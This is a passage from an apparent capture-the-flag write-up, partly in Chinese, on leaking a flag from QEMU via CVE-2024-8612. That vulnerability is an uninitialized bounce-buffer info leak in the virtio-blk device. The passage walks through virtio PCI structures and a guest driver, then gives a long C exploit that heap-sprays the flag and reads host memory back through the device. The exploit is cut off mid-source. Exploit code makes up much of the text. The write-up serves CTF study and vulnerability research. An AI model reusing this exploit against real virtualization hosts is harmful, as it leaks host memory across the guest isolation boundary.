[rbp-20h]\n\n  if ( addr &gt; 0x7F )\n  {\n    if ( size != 4 )\n      return;\n  }\n  else if ( size != 4 )\n  {\n    if ( size == 8 &amp;&amp; addr == 8 )\n      goto LABEL_6;\n    return;\n  }\n  if ( addr )\n  {\n    if ( addr == 8 )\nLABEL_6:\n      *(_QWORD *)(opaque + 2984) = val;\n  }\n  else if ( val &lt;= 0xFFF )\n  {\n    v8 = val;\n    v4 = malloc(val);\n    if ( v4 )\n    {\n      v5 = fopen64(\"flag\", \"r\");\n      v6 = v5;\n      if ( v5 )\n      {\n        v7 = fread(v4, 1uLL, (unsigned int)(v8 - 1), v5);\n        if ( v7 )\n          *((_BYTE *)v4 + v7) = 0;\n        else\n          puts(\"No data read from the file.\");\n        free(v4);\n        fclose(v6);\n      }\n      else\n      {\n        perror(\"Error opening file\");\n        free(v4);\n      }\n    }\n    else\n    {\n      perror(\"Memory allocation failed\");\n    }\n  }\n}\nVirtio Block Device1\nData types definition\nFor the integer data types used in the structure definitions, the\nfollowing conventions are used:\n\nu8, u16, u32, u64\nAn unsigned integer of the specified length in bits.\nle16, le32, le64\nAn unsigned integer of the specified length in bits, in little-endian\nbyte order.\n\n#define u8 uint8_t\n#define u16 uint16_t\n#define u32 uint32_t\n#define u64 uint64_t\n#define le16 u16\n#define le32 u32\n#define le64 u64\nPCI Capabilities\nstruct virtio_pci_cap {\n    u8 cap_vndr; /* Generic PCI field: PCI_CAP_ID_VNDR */\n    u8 cap_next; /* Generic PCI field: next ptr. */\n    u8 cap_len; /* Generic PCI field: capability length */\n    u8 cfg_type; /* Identifies the structure. */\n    u8 bar; /* Where to find it. */\n    u8 id; /* Multiple capabilities of the same type */\n    u8 padding[2]; /* Pad to full dword. */\n    le32 offset; /* Offset within bar. */\n    le32 length; /* Length of the structure, in bytes. */\n};\ncfg_type identifies the structure,\naccording to the following table:\n/* Common configuration */\n#define VIRTIO_PCI_CAP_COMMON_CFG 1\n/* Notifications */\n#define VIRTIO_PCI_CAP_NOTIFY_CFG 2\n/* ISR Status */\n#define VIRTIO_PCI_CAP_ISR_CFG 3\n/* Device specific configuration */\n#define VIRTIO_PCI_CAP_DEVICE_CFG 4\n/* PCI configuration access */\n#define VIRTIO_PCI_CAP_PCI_CFG 5\n/* Shared memory region */\n#define VIRTIO_PCI_CAP_SHARED_MEMORY_CFG 8\n/* Vendor-specific data */\n#define VIRTIO_PCI_CAP_VENDOR_CFG 9\nFor common configuration, its layout is\nbelow:\nstruct virtio_pci_common_cfg {\n    /* About the whole device. */\n    le32 device_feature_select; /* read-write */\n    le32 device_feature; /* read-only for driver */\n    le32 driver_feature_select; /* read-write */\n    le32 driver_feature; /* read-write */\n    le16 config_msix_vector; /* read-write */\n    le16 num_queues; /* read-only for driver */\n    u8 device_status; /* read-write */\n    u8 config_generation; /* read-only for driver */\n    /* About a specific virtqueue. */\n    le16 queue_select; /* read-write */\n    le16 queue_size; /* read-write */\n    le16 queue_msix_vector; /* read-write */\n    le16 queue_enable; /* read-write */\n    le16 queue_notify_off; /* read-only for driver */\n    le64 queue_desc; /* read-write */\n    le64 queue_driver; /* read-write */\n    le64 queue_device; /* read-write */\n    le16 queue_notif_config_data; /* read-only for driver */\n    le16 queue_reset; /* read-write */\n    /* About the administration virtqueue. */\n    le16 admin_queue_index; /* read-only for driver */\n    le16 admin_queue_num; /* read-only for driver */\n};\nFor notification, its layout is below:\nstruct virtio_pci_notify_cap {\n    struct virtio_pci_cap cap;\n    le32 notify_off_multiplier; /* Multiplier for queue_notify_off. */\n};\n\nWe recognize these type, and record the offset.\nvoid print_cap(struct virtio_pci_cap* cap){\n    printf(\"cap_len: %x\\n\", cap-&gt;cap_len);\n    switch(cap-&gt;cfg_type){\n        case VIRTIO_PCI_CAP_COMMON_CFG:\n            printf(\"cfg_type: common\\n\");\n            break;\n        case VIRTIO_PCI_CAP_NOTIFY_CFG:\n            printf(\"cfg_type: notify\\n\");\n            break;\n        case VIRTIO_PCI_CAP_ISR_CFG:\n            printf(\"cfg_type: isr\\n\");\n            break;\n        case VIRTIO_PCI_CAP_DEVICE_CFG:\n            printf(\"cfg_type: device\\n\");\n            break;\n        case VIRTIO_PCI_CAP_PCI_CFG:\n            printf(\"cfg_type: pci\\n\");\n            break;\n        case VIRTIO_PCI_CAP_SHARED_MEMORY:\n            printf(\"cfg_type: shared memory\\n\");\n            break;\n        case VIRTIO_PCI_CAP_VENDOR_CFG:\n            printf(\"cfg_type: vendor\\n\");\n            break;\n        default:\n            printf(\"cfg_type: unknown\\n\");\n            break;\n    }\n    printf(\"bar: %x\\n\", cap-&gt;bar);\n    printf(\"id: %x\\n\", cap-&gt;id);\n    printf(\"offset: %x\\n\", cap-&gt;offset);\n    printf(\"length: %x\\n\", cap-&gt;length);\n}\n\nswitch(cap.cfg_type){\n            case VIRTIO_PCI_CAP_COMMON_CFG:\n                virtio_common_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_NOTIFY_CFG:\n                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);\n                break;\n            case VIRTIO_PCI_CAP_ISR_CFG:\n                virtio_isr_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_DEVICE_CFG:\n                virtio_device_mmio = virtio_mmio + cap.offset;\n                break;\n            default:\n                break;\n        }\nVirtqueue2\nThe mechanism for bulk data transport on virtio devices is\npretentiously called a virtqueue. Each device can have zero or more\nvirtqueues.\nEach virtqueue can consist of up to 3 parts:\n​ • Descriptor Area - used for describing buffers\n​ • Driver Area - extra data supplied by driver to the device. Also\ncalled avail virtqueue.\n​ • Device Area - extra data supplied by device to driver. Also called\nused virtqueue.\n\n\nShared memory with split ring\nelements\n\nThere areas structure defined below:\nstruct virtq_desc {\n    /* Address (guest-physical). */\n    le64 addr;\n    /* Length. */\n    le32 len;\n/* This marks a buffer as continuing via the next field. */\n#define VIRTQ_DESC_F_NEXT 1\n/* This marks a buffer as device write-only (otherwise device read-only). */\n#define VIRTQ_DESC_F_WRITE 2\n/* This means the buffer contains a list of buffer descriptors. */\n#define VIRTQ_DESC_F_INDIRECT 4\n    /* The flags as indicated above. */\n    le16 flags;\n    /* Next field if flags &amp; NEXT */\n    le16 next;\n};\n\nstruct virtq_avail {\n#define VIRTQ_AVAIL_F_NO_INTERRUPT 1\n    le16 flags;\n    le16 idx;\n    le16 ring[VIRTIO_QUEUE_SIZE];\n    le16 used_event; /* Only if VIRTIO_F_EVENT_IDX */\n};\n\nstruct virtq_used_elem {\n    /* Index of start of used descriptor chain. */\n    le32 id;\n\n    /*\n    * The number of bytes written into the device writable portion of\n    * the buffer described by the descriptor chain.\n    */\n    le32 len;\n};\n\nstruct virtq_used {\n#define VIRTQ_USED_F_NO_NOTIFY 1\n    le16 flags;\n    le16 idx;\n    struct virtq_used_elem ring[VIRTIO_QUEUE_SIZE];\n    le16 avail_event; /* Only if VIRTIO_F_EVENT_IDX */\n};\n\nThe driver queues requests to the virtqueue, the type of the request\nis either a read (VIRTIO_BLK_T_IN), a write (VIRTIO_BLK_T_OUT), a\ndiscard (VIRTIO_BLK_T_DISCARD), a write zeroes\n(VIRTIO_BLK_T_WRITE_ZEROES) or a flush (VIRTIO_BLK_T_FLUSH).\nstruct virtio_blk_req { \n        le32 type; \n        le32 reserved; \n        le64 sector; \n        u8 data[][512]; \n        u8 status; \n}; \n \nstruct virtio_blk_discard_write_zeroes { \n       le64 sector; \n       le32 num_sectors; \n       struct { \n               le32 unmap:1; \n               le32 reserved:31; \n       } flags; \n};\n\n#define VIRTIO_BLK_T_IN           0 \n#define VIRTIO_BLK_T_OUT          1 \n#define VIRTIO_BLK_T_FLUSH        4 \n#define VIRTIO_BLK_T_DISCARD      11 \n#define VIRTIO_BLK_T_WRITE_ZEROES 13\nMMIO3\nMemory-mapped I/O (MMIO) uses the\nsame address space to address both main memory and I/O devices. The\nmemory and registers of the I/O devices are mapped to (associated with)\naddress values, so a memory address may refer to either a portion of\nphysical RAM or to memory and registers of the I/O device.\nuint8_t mmio_read8(void* addr){\n    return *(volatile uint8_t*)addr;\n}\n\nuint16_t mmio_read16(void* addr){\n    return *(volatile uint16_t*)addr;\n}\n\nuint32_t mmio_read32(void* addr){\n    return *(volatile uint32_t*)addr;\n}\n\nuint64_t mmio_read64(void* addr){\n    return *(volatile uint64_t*)addr;\n}\n\nvoid mmio_write8(void* addr, uint8_t val){\n    *(volatile uint8_t*)addr = val;\n}\n\nvoid mmio_write16(void* addr, uint16_t val){\n    *(volatile uint16_t*)addr = val;\n}\n\nvoid mmio_write32(void* addr, uint32_t val){\n    *(volatile uint32_t*)addr = val;\n}\n\nvoid mmio_write64(void* addr, uint64_t val){\n    *(volatile uint64_t*)addr = val;\n}\nDevice configuration layout\nstruct virtio_blk_config {\n        le64 capacity;\n        le32 size_max;\n        le32 seg_max;\n    struct virtio_blk_geometry {\n        le16 cylinders;\n        u8 heads;\n        u8 sectors;\n    } geometry;\n    le32 blk_size;\n    struct virtio_blk_topology {\n        // # of logical blocks per physical block (log2)\n        u8 physical_block_exp;\n        // offset of first aligned logical block\n        u8 alignment_offset;\n        // suggested minimum I/O size in blocks\n        le16 min_io_size;\n        // optimal (suggested maximum) I/O size in blocks\n        le32 opt_io_size;\n    } topology;\n    u8 writeback;\n    u8 unused0;\n    u16 num_queues;\n    le32 max_discard_sectors;\n    le32 max_discard_seg;\n    le32 discard_sector_alignment;\n    le32 max_write_zeroes_sectors;\n    le32 max_write_zeroes_seg;\n    u8 write_zeroes_may_unmap;\n    u8 unused1[3];\n    le32 max_secure_erase_sectors;\n    le32 max_secure_erase_seg;\n    le32 secure_erase_sector_alignment;\n    struct virtio_blk_zoned_characteristics {\n        le32 zone_sectors;\n        le32 max_open_zones;\n        le32 max_active_zones;\n        le32 max_append_sectors;\n        le32 write_granularity;\n        u8 model;\n        u8 unused2[3];\n    } zoned;\n};\nInitialization\n\nRead capabilities\nReset device\nReset Virtqueue\n\nvoid init_virtio() {\n    int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/config\", O_RDONLY);\n    if(fd &lt; 0){\n        ERR(\"Open virtio config\");\n    }\n    struct virtio_pci_cap cap;\n    char* config = malloc(0x1000);\n    int bytes_read = read(fd, config, 0x1000);\n    if(bytes_read &lt; 0){\n        ERR(\"Read virtio config\");\n    }\n\n    fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource4\", O_RDWR | O_SYNC);\n    if(fd &lt; 0){\n        ERR(\"Open virtio resource4\");\n    }\n    virtio_mmio = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n    if(virtio_mmio == (volatile void*)-1){\n        ERR(\"mmap virtio mem\");\n    }\n    close(fd);\n\n    u8 cap_ptr = *(u8*)(config+0x34);\n    while(cap_ptr != 0){\n        if(config[cap_ptr] != 0x9){\n            cap_ptr = *(u8*)(config+cap_ptr+1);\n            continue;\n        }\n        memcpy(&amp;cap, config+cap_ptr, sizeof(cap));\n        print_cap(&amp;cap);\n        switch(cap.cfg_type){\n            case VIRTIO_PCI_CAP_COMMON_CFG:\n                virtio_common_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_NOTIFY_CFG:\n                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);\n                break;\n            case VIRTIO_PCI_CAP_ISR_CFG:\n                virtio_isr_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_DEVICE_CFG:\n                virtio_device_mmio = virtio_mmio + cap.offset;\n                break;\n            default:\n                break;\n        }\n        cap_ptr = cap.cap_next;\n    }\n    close(fd);\n    free(config);\n\n    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;\n    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 0);\n    printf(\"device_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));\n    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 1);\n    printf(\"device_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);\n    printf(\"driver_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 1);\n    printf(\"driver_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));\n\n    struct virtio_blk_config* blk_cfg = (struct virtio_blk_config*)virtio_device_mmio;\n    printf(\"capacity: %lx\\n\", mmio_read64(&amp;blk_cfg-&gt;capacity));\n    printf(\"size_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;size_max));\n    printf(\"seg_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;seg_max));\n    printf(\"geometry.cylinders: %x\\n\", mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));\n    printf(\"geometry.heads: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.heads));\n    printf(\"geometry.sectors: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));\n    printf(\"blk_size: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;blk_size));\n\n    // reset device\n    mmio_write8(&amp;common_cfg-&gt;device_status, 0);\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);\n    mmio_write32(&amp;common_cfg-&gt;driver_feature, 0); // disable all features\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);\n\n\n    // alloc dma memory\n    int dma_fd = open(\"/dev/mem\", O_RDWR | O_SYNC);\n    if(dma_fd &lt; 0){\n        ERR(\"Open dma\");\n    }\n    dma_mem = mmap((void*)0x3ffdd000, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0x3ffdd000);\n    if(dma_mem == (volatile void*)-1){\n        ERR(\"mmap dma mem\");\n    }\n    *(volatile uint32_t*)dma_mem = 0x12345678;\n    printf(\"%x\\n\", *(volatile uint32_t*)dma_mem);\n    *(volatile uint32_t*)dma_mem = 0;\n    printf(\"dma_mem: %p\\n\", dma_mem);\n    dma_data = dma_mem + 0x1000;\n    queue_desc = (struct virtq_desc*)dma_mem;\n    queue_avail = (struct virtq_avail*)((char*)queue_desc + 0x10 * VIRTIO_QUEUE_SIZE);\n    queue_used = (struct virtq_used*)((char*)dma_mem + 0x200);\n\n    // init queue\n    mmio_write16(&amp;common_cfg-&gt;queue_select, 0);\n    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);\n    mmio_write64(&amp;common_cfg-&gt;queue_desc, (size_t)0x3ffdd000);\n    mmio_write64(&amp;common_cfg-&gt;queue_driver, (size_t)0x3ffdd100);\n    mmio_write64(&amp;common_cfg-&gt;queue_device, (size_t)0x3ffdd200);\n    mmio_write16(&amp;common_cfg-&gt;queue_enable, 1);\n\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    puts(\"virtio init done\");\n}\nVulnerabilities\nCVE-2024-8612\n从文件的字符串中可得知 qemu 的版本号为 qemu-8.0.0-rc2，存在一个关于 virtio-blk-pci 的信息泄漏漏洞:\nCVE-2024-8612\n具体利用还可以参考:\nHEXACON2024 -\nDMAKiller: DMA to Escape from QEMU/KVM by Yongkang Jia, Yiming Tao &amp;\nXiao Lei,\nACTF2025-EasyDMA\nWriteup\n当 DMA 访问的地址是 MMIO 的，会使用 bounce buffer\n/* Map a physical memory region into a host virtual address.\n * May map a subset of the requested range, given by and returned in *plen.\n * May return NULL if resources needed to perform the mapping are exhausted.\n * Use only for reads OR writes - not for read-modify-write operations.\n * Use cpu_register_map_client() to know when retrying the map operation is\n * likely to succeed.\n */\nvoid *address_space_map(AddressSpace *as,\n                        hwaddr addr,\n                        hwaddr *plen,\n                        bool is_write,\n                        MemTxAttrs attrs)\n{\n    hwaddr len = *plen;\n    hwaddr l, xlat;\n    MemoryRegion *mr;\n    FlatView *fv;\n\n    if (len == 0) {\n        return NULL;\n    }\n\n    l = len;\n    RCU_READ_LOCK_GUARD();\n    fv = address_space_to_flatview(as);\n    mr = flatview_translate(fv, addr, &amp;xlat, &amp;l, is_write, attrs);\n\n    if (!memory_access_is_direct(mr, is_write)) {\n        if (qatomic_xchg(&amp;bounce.in_use, true)) {\n            *plen = 0;\n            return NULL;\n        }\n               /* Avoid unbounded allocations */\n        l = MIN(l, TARGET_PAGE_SIZE);\n        bounce.buffer = qemu_memalign(TARGET_PAGE_SIZE, l);\n        bounce.addr = addr;\n        bounce.len = l;\n\n        memory_region_ref(mr);\n        bounce.mr = mr;\n        if (!is_write) {\n            flatview_read(fv, addr, MEMTXATTRS_UNSPECIFIED,\n                               bounce.buffer, l);\n        }\n\n        *plen = l;\n        return bounce.buffer;\n    }\n\t//...\n}\n同时，通过 qemu_memalign 得到的内存并没有初始化。\nstatic int virtio_blk_handle_request(VirtIOBlockReq *req, MultiReqBuffer *mrb)\n{\n    uint32_t type;\n    struct iovec *in_iov = req-&gt;elem.in_sg;\n    struct iovec *out_iov = req-&gt;elem.out_sg;\n    unsigned in_num = req-&gt;elem.in_num;\n    unsigned out_num = req-&gt;elem.out_num;\n    VirtIOBlock *s = req-&gt;dev;\n    VirtIODevice *vdev = VIRTIO_DEVICE(s);\n    \n    if (req-&gt;elem.out_num &lt; 1 || req-&gt;elem.in_num &lt; 1) {\n        virtio_error(vdev, \"virtio-blk missing headers\");\n        return -1;\n    }\n\n    if (unlikely(iov_to_buf(out_iov, out_num, 0, &amp;req-&gt;out,\n                            sizeof(req-&gt;out)) != sizeof(req-&gt;out))) {\n        virtio_error(vdev, \"virtio-blk request outhdr too short\");\n        return -1;\n    }\n\n    iov_discard_front_undoable(&amp;out_iov, &amp;out_num, sizeof(req-&gt;out),\n                               &amp;req-&gt;outhdr_undo);\n\n    if (in_iov[in_num - 1].iov_len &lt; sizeof(struct virtio_blk_inhdr)) {\n        virtio_error(vdev, \"virtio-blk request inhdr too short\");\n        iov_discard_undo(&amp;req-&gt;outhdr_undo);\n        return -1;\n    }\n    \n    //...\n    \n    req-&gt;in_len = iov_size(in_iov, in_num);\n    \n    //...\n    \n    case VIRTIO_BLK_T_IN:\n    {\n        bool is_write = type &amp; VIRTIO_BLK_T_OUT;\n        req-&gt;sector_num = virtio_ldq_p(vdev, &amp;req-&gt;out.sector);\n\n        if (is_write) {\n            qemu_iovec_init_external(&amp;req-&gt;qiov, out_iov, out_num);\n            trace_virtio_blk_handle_write(vdev, req, req-&gt;sector_num,\n                                          req-&gt;qiov.size / BDRV_SECTOR_SIZE);\n        } else {\n            qemu_iovec_init_external(&amp;req-&gt;qiov, in_iov, in_num);\n            trace_virtio_blk_handle_read(vdev, req, req-&gt;sector_num,\n                                         req-&gt;qiov.size / BDRV_SECTOR_SIZE);\n        }\n\n        if (!virtio_blk_sect_range_ok(s, req-&gt;sector_num, req-&gt;qiov.size)) {\n            virtio_blk_req_complete(req, VIRTIO_BLK_S_IOERR);\n            block_acct_invalid(blk_get_stats(s-&gt;blk),\n                               is_write ? BLOCK_ACCT_WRITE : BLOCK_ACCT_READ);\n            virtio_blk_free_request(req);\n            return 0;\n        }\n        \n\t//...\n\n    default:\n    virtio_blk_req_complete(req, VIRTIO_BLK_S_UNSUPP);\n    virtio_blk_free_request(req);\n        \n}\n在 virtio_blk_handle_request，即使请求不合法，长度也被写入到 req-&gt;in_len。type 不合法时，直接调用 virtio_blk_req_complete\n调用链：virtio_blk_handle_request-&gt;virtio_blk_req_complete-&gt;virtqueue_push-&gt;virtqueue_fill-&gt;virtqueue_unmap_sg-&gt;dma_memory_unmap-&gt;address_space_unmap-&gt;address_space_write\nMemTxResult address_space_write(AddressSpace *as, hwaddr addr,\n                                MemTxAttrs attrs,\n                                const void *buf, int len)\n{\n    MemTxResult result;\n    __bufread(buf, len);\n    return result;\n}\n由于缺乏保护，数据可以被写到 Common\nconfiguration 部分，并且部分空间可被读出。\nExploit\n通过堆喷，将 flag 字符串填充在内存中。利用上述漏洞读出内存内容。\n#include&lt;stddef.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;unistd.h&gt;\n#include&lt;fcntl.h&gt;\n#include&lt;sys/mman.h&gt;\n#include&lt;string.h&gt;\n#include&lt;stdio.h&gt;\n#include&lt;assert.h&gt;\n#include&lt;stdint.h&gt;\n#include&lt;sys/io.h&gt;\n#include&lt;linux/stddef.h&gt;\n\n#define u8 uint8_t\n#define u16 uint16_t\n#define u32 uint32_t\n#define u64 uint64_t\n#define le16 u16\n#define le32 u32\n#define le64 u64\n\nstruct virtio_pci_cap {\n    u8 cap_vndr;\n    u8 cap_next;\n    u8 cap_len;\n    u8 cfg_type;\n    u8 bar;\n    u8 id;\n    u8 padding[2];\n    le32 offset;\n    le32 length;\n};\n\nstruct virtio_pci_common_cfg {\n    /* About the whole device. */\n    le32 device_feature_select; /* read-write */\n    le32 device_feature; /* read-only for driver */\n    le32 driver_feature_select; /* read-write */\n    le32 driver_feature; /* read-write */\n    le16 config_msix_vector; /* read-write */\n    le16 num_queues; /* read-only for driver */\n    u8 device_status; /* read-write */\n    u8 config_generation; /* read-only for driver */\n    /* About a specific virtqueue. */\n    le16 queue_select; /* read-write */\n    le16 queue_size; /* read-write */\n    le16 queue_msix_vector; /* read-write */\n    le16 queue_enable; /* read-write */\n    le16 queue_notify_off; /* read-only for driver */\n    le64 queue_desc; /* read-write */\n    le64 queue_driver; /* read-write */\n    le64 queue_device; /* read-write */\n    le16 queue_notify_data; /* read-only for driver */\n    le16 queue_reset; /* read-write */\n};\n\nstruct virtio_notify_cfg {\n    struct virtio_pci_cap cap;\n    le32 notify_off_multiplier;\n};\n\nstruct virtio_blk_config{\n    le64 capacity;\n    le32 size_max;\n    le32 seg_max;\n    struct virtio_blk_geometry {\n        le16 cylinders;\n        u8 heads;\n        u8 sectors;\n    } geometry;\n    le32 blk_size;\n    struct virtio_blk_topology {\n        // # of logical blocks per physical block (log2)\n        u8 physical_block_exp;\n        // offset of first aligned logical block\n        u8 alignment_offset;\n        // suggested minimum I/O size in blocks\n        le16 min_io_size;\n        // optimal (suggested maximum) I/O size in blocks\n        le32 opt_io_size;\n    } topology;\n    u8 writeback;\n    u8 unused0;\n    u16 num_queues;\n    le32 max_discard_sectors;\n    le32 max_discard_seg;\n    le32 discard_sector_alignment;\n    le32 max_write_zeroes_sectors;\n    le32 max_write_zeroes_seg;\n    u8 write_zeroes_may_unmap;\n    u8 unused1[3];\n    le32 max_secure_erase_sectors;\n    le32 max_secure_erase_seg;\n    le32 secure_erase_sector_alignment;\n};\n\nenum virtio_pci_cfg_type{\n    VIRTIO_PCI_CAP_COMMON_CFG = 0x1,\n    VIRTIO_PCI_CAP_NOTIFY_CFG = 0x2,\n    VIRTIO_PCI_CAP_ISR_CFG = 0x3,\n    VIRTIO_PCI_CAP_DEVICE_CFG = 0x4,\n    VIRTIO_PCI_CAP_PCI_CFG = 0x5,\n    VIRTIO_PCI_CAP_SHARED_MEMORY = 0x8,\n    VIRTIO_PCI_CAP_VENDOR_CFG = 0x9,\n};\n\n/* Feature bits */\n#define VIRTIO_BLK_F_SIZE_MAX\t1\t/* Indicates maximum segment size */\n#define VIRTIO_BLK_F_SEG_MAX\t2\t/* Indicates maximum # of segments */\n#define VIRTIO_BLK_F_GEOMETRY\t4\t/* Legacy geometry available  */\n#define VIRTIO_BLK_F_RO\t\t5\t/* Disk is read-only */\n#define VIRTIO_BLK_F_BLK_SIZE\t6\t/* Block size of disk is available*/\n#define VIRTIO_BLK_F_FLUSH\t9\t/* Flush command supported */\n#define VIRTIO_BLK_F_TOPOLOGY\t10\t/* Topology information is available */\n#define VIRTIO_BLK_F_MQ\t\t12\t/* support more than one vq */\n#define VIRTIO_BLK_F_DISCARD\t13\t/* DISCARD is supported */\n#define VIRTIO_BLK_F_WRITE_ZEROES\t14\t/* WRITE ZEROES is supported */\n#define VIRTIO_BLK_F_SECURE_ERASE\t16 /* Secure Erase is supported */\n\n/* Status byte for guest to report progress, and synchronize features. */\n/* We have seen device and processed generic fields (VIRTIO_CONFIG_F_VIRTIO) */\n#define VIRTIO_CONFIG_S_ACKNOWLEDGE\t1\n/* We have found a driver for the device. */\n#define VIRTIO_CONFIG_S_DRIVER\t\t2\n/* Driver has used its parts of the config, and is happy */\n#define VIRTIO_CONFIG_S_DRIVER_OK\t4\n/* Driver has finished configuring features */\n#define VIRTIO_CONFIG_S_FEATURES_OK\t8\n/* Device entered invalid state, driver must reset it */\n#define VIRTIO_CONFIG_S_NEEDS_RESET\t0x40\n/* We've given up on this device. */\n#define VIRTIO_CONFIG_S_FAILED\t\t0x80\n\n#define VIRTIO_QUEUE_SIZE 0x10\n\nstruct virtq_desc {\n    /* Address (guest-physical). */\n    le64 addr;\n    /* Length. */\n    le32 len;\n/* This marks a buffer as continuing via the next field. */\n#define VIRTQ_DESC_F_NEXT 1\n/* This marks a buffer as device write-only (otherwise device read-only). */\n#define VIRTQ_DESC_F_WRITE 2\n/* This means the buffer contains a list of buffer descriptors. */\n#define VIRTQ_DESC_F_INDIRECT 4\n    /* The flags as indicated above. */\n    le16 flags;\n    /* Next field if flags &amp; NEXT */\n    le16 next;\n};\n\nstruct virtq_avail {\n#define VIRTQ_AVAIL_F_NO_INTERRUPT 1\n    le16 flags;\n    le16 idx;\n    le16 ring[VIRTIO_QUEUE_SIZE];\n    le16 used_event; /* Only if VIRTIO_F_EVENT_IDX */\n};\n\nstruct virtq_used_elem {\n    /* Index of start of used descriptor chain. */\n    le32 id;\n\n    /*\n    * The number of bytes written into the device writable portion of\n    * the buffer described by the descriptor chain.\n    */\n    le32 len;\n};\n\nstruct virtq_used {\n#define VIRTQ_USED_F_NO_NOTIFY 1\n    le16 flags;\n    le16 idx;\n    struct virtq_used_elem ring[VIRTIO_QUEUE_SIZE];\n    le16 avail_event; /* Only if VIRTIO_F_EVENT_IDX */\n};\n\nstruct virtio_blk_req {\n    le32 type;\n    le32 reserved;\n    le64 sector;\n    u8 data[0];\n    // u8 status;\n};\n\n#define VIRTIO_BLK_T_IN 0\n#define VIRTIO_BLK_T_OUT 1\n#define VIRTIO_BLK_T_FLUSH 4\n#define VIRTIO_BLK_T_GET_ID 8\n#define VIRTIO_BLK_T_GET_LIFETIME 10\n#define VIRTIO_BLK_T_DISCARD 11\n#define VIRTIO_BLK_T_WRITE_ZEROES 13\n#define VIRTIO_BLK_T_SECURE_ERASE 14\n\n\nvoid print_cap(struct virtio_pci_cap* cap){\n    printf(\"cap_len: %x\\n\", cap-&gt;cap_len);\n    switch(cap-&gt;cfg_type){\n        case VIRTIO_PCI_CAP_COMMON_CFG:\n            printf(\"cfg_type: common\\n\");\n            break;\n        case VIRTIO_PCI_CAP_NOTIFY_CFG:\n            printf(\"cfg_type: notify\\n\");\n            break;\n        case VIRTIO_PCI_CAP_ISR_CFG:\n            printf(\"cfg_type: isr\\n\");\n            break;\n        case VIRTIO_PCI_CAP_DEVICE_CFG:\n            printf(\"cfg_type: device\\n\");\n            break;\n        case VIRTIO_PCI_CAP_PCI_CFG:\n            printf(\"cfg_type: pci\\n\");\n            break;\n        case VIRTIO_PCI_CAP_SHARED_MEMORY:\n            printf(\"cfg_type: shared memory\\n\");\n            break;\n        case VIRTIO_PCI_CAP_VENDOR_CFG:\n            printf(\"cfg_type: vendor\\n\");\n            break;\n        default:\n            printf(\"cfg_type: unknown\\n\");\n            break;\n    }\n    printf(\"bar: %x\\n\", cap-&gt;bar);\n    printf(\"id: %x\\n\", cap-&gt;id);\n    printf(\"offset: %x\\n\", cap-&gt;offset);\n    printf(\"length: %x\\n\", cap-&gt;length);\n}\n\nvoid ERR(const char* buf){\n    perror(buf);\n    abort();\n}\n\nvoid LOG(const char* buf){\n    write(2, buf, strlen(buf));\n}\n\nvolatile char* readflag_mmio = NULL;\nvolatile char* virtio_mmio = NULL;\nvolatile char* virtio_common_mmio = NULL;\nvolatile struct virtio_notify_cfg* virtio_notify_mmio = NULL;\nvolatile char* virtio_isr_mmio = NULL;\nvolatile char* virtio_device_mmio = NULL;\nvolatile char* dma_mem = NULL;\nvolatile char* dma_data = NULL;\nvolatile struct virtq_desc* queue_desc = NULL;\nvolatile struct virtq_avail* queue_avail = NULL;\nvolatile struct virtq_used* queue_used = NULL;\n\nvoid init_readflag(){\n    int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:05.0/resource0\", O_RDWR | O_SYNC);\n    if(mmio_fd &lt; 0){\n        ERR(\"Open readflag\");\n    }\n    readflag_mmio = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n    if(readflag_mmio == (volatile void*)-1){\n        ERR(\"mmap mmio_mem\");\n    }\n    close(mmio_fd);\n\n    puts(\"readflag init done\");\n}\n\nuint8_t mmio_read8(void* addr){\n    return *(volatile uint8_t*)addr;\n}\n\nuint16_t mmio_read16(void* addr){\n    return *(volatile uint16_t*)addr;\n}\n\nuint32_t 